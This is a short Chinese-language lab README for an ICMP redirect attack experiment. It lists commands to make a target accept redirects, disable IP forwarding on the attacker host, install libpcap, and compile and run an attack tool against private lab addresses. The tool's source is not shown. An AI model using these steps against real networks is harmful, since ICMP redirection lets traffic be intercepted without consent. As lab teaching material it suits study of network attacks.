
## icmp重定向攻击实验

### 目标主机接受ICMP重定向
需要以root身份修改：
echo “1” > /proc/sys/net/ipv4/conf/all/accept_redirects

### 关闭攻击者ip转发
echo “0” > /proc/sys/net/ipv4/ip_forward


安装pcap开发库 sudo apt-get install libpcap-dev

编译 g++ -g -o icmpd icmp_redirect.cpp -lpcap -std=c++11

运行 ./icmpd 192.168.60.134 192.168.60.132 192.168.60.2 eth0
